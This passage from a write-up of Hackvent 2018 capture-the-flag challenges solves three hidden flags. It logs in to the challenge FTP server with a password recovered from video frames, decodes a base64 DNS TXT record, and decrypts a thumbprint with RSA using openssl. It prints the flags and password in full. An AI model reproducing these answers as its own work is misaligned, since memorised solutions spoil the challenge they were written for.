However, when you take a closer look at the frames (when there is the "snow"), there are sometimes characters hidden. Combine them to get a password *ctrl154n1llu51on*.

Ok, so where could we use that password? There is also an open ftp port! So lets try it there:
```
ftp challenges.hackvent.hacking-lab.com
Connected to challenges.hackvent.hacking-lab.com.
220 Welcome to Santas FTP-Server
Name (challenges.hackvent.hacking-lab.com:hacker): santa
331 Username ok, send password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 Active data connection established.
550 Not enough privileges.
ftp> get flag
local: flag remote: flag
200 Active data connection established.
550 No such file or directory.
ftp> get flag.txt
local: flag.txt remote: flag.txt
200 Active data connection established.
125 Data connection already open. Transfer starting.
226 Transfer complete.
456 bytes received in 0.05 secs (8.3202 kB/s)
ftp> quit
221 Goodbye.
```
See the downloaded [flag.txt](hidden/flag.txt): **HV18-PORT-scan-sARE-essn-tial**

### DNS TXT entry
During [Day 5](#day-5), we had to check the DNS entries of the server and when you execute `dig www.hackvent.org TXT`, there was a TXT entry which reads *Nice try, but this would be too easy, nah? However, get a hidden flag: SFYxOC1PU0lOLVRjNG4tUjNWMy1hbEl0LUFsbDE=*. This looks like base64..

The flag is: **HV18-OSIN-Tc4n-R3V3-alIt-All1**

### thumbprint in power.ps1
In the challenge from [Day 14](#day-14) where the Rabin cryptosystem was used to encrypt the flag, there is a comment in the first line reading `#thumbprint 1398ED7F59A62962D5A47DD0D32B71156DD6AF6B46BEA949976331B8E1`. I tried to decode this value with the same Rabin functions, but it did not work, however, if you pass it to the standard RSA function using the same p and q, but with exponent 65537, it works and reveals another hidden flag.

1. Convert p and q to a key file using rsatool (https://github.com/ius/rsatool)  
`python3 rsatool.py -p 73197682537506302133452713613304371 -q 79797652691134123797009598697137499 -f PEM -o key.pem`
2. Use openssl for decryption  
`echo -e -n "\x13\x98\xED\x7F\x59\xA6\x29\x62\xD5\xA4\x7D\xD0\xD3\x2B\x71\x15\x6D\xD6\xAF\x6B\x46\xBE\xA9\x49\x97\x63\x31\xB8\xE1" | openssl rsautl -inkey key.pem -keyform PEM -decrypt -raw`

The flag is **HV18-fn8o-Az1a-cbpG-6gJd-sPkU**
